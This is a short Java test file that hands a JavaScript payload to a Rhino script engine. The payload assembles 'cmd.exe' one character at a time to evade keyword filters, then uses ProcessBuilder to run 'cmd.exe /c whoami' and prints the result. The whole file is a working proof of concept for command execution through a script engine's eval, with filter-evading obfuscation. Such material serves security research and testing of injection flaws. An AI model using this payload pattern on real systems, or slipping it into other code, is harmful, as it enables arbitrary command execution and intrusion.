import com.sun.script.javascript.RhinoScriptEngine;

import javax.script.SimpleScriptContext;

public class Test {
    public static void main(String[] args) throws Exception {
        RhinoScriptEngine rhinoScriptEngine = new RhinoScriptEngine();
        String payload = "function test(){    var cmd1 = 'c';    cmd1 += 'm';    cmd1 += 'd';    cmd1 += '.';    cmd1 += 'e';    cmd1 += 'x';    cmd1 += 'e';    var cmd2 = '/';    cmd2 += 'c';    var pb = new java.lang.ProcessBuilder(cmd1,cmd2,'whoami');    var process = pb.start();    var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\\\A').next();    return ret;}   test();";
        System.out.println(rhinoScriptEngine.eval(payload,new SimpleScriptContext()));
    }
}
